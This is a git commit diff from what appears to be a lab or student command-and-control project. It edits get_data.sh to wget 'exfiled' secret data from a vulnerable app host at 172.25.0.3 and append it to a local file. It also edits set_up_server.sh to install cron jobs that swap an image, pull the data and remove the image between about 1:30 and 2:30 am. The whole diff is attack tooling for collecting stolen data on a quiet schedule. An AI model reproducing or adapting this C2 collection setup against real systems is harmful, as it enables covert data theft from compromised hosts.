d1ce123f59b15c657e5ff36a25367e69138abfa9
kScrane <124896848+kScrane@users.noreply.github.com>
2023-05-14 11:48:46 -0400

    Making C2 download data from vul_app

--- C2/get_data.sh
+++ C2/get_data.sh
@@ -2,7 +2,9 @@
 Use this to download the exfiled data
 Download between 1:30 and 2:30 am
 """
-
+ip=172.25.0.3
 data="found_secret_data.txt"
 echo '\n' $(date) '\n' >> $data
-wget -O http://$1:8080/secretData.html >> $data
+wget -O new.txt http://$ip:8080/secretData.html 
+cat "new.txt" >> $data
+rm new.txt
--- C2/set_up_server.sh
+++ C2/set_up_server.sh
@@ -4,11 +4,11 @@
 crontab -l > crontab_new 
 
 path=$(pwd)
-#echo "20 01 * * * * $path/change_image.sh $1" >> crontab_new
-#echo "40 01 * * * $path/get_data.sh" >> crontab_new
-#echo "00 02 * * * * $path/remove_image.sh $1" >> crontab_new
+echo "20 01 * * * * $path/change_image.sh $1" >> crontab_new
+echo "40 01 * * * $path/get_data.sh" >> crontab_new
+echo "00 02 * * * * $path/remove_image.sh $1" >> crontab_new
 #for testing, have it run every 5 minutes
-echo "*/5 * * * * $path/get_data.sh $1" >> crontab_new
+#echo "*/5 * * * * $path/get_data.sh 172.25.0.3" >> crontab_new
 
 crontab crontab_new
 rm crontab_new
